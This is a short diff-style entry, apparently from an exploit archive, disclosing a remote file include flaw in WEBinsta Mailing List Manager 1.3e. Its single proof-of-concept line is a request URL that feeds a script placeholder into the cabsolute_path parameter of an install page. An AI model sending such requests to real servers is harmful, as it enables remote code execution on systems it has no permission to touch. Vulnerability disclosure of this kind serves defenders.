@@ -1,0 +1,6 @@
++ WEBinsta Mailing List Manager 1.3e Remote File Include Proof of Concept
++ 
++ PoC:
++
++ http://www.example.com/install/install3.php?database=none&cabsolute_path=[script]
++ 
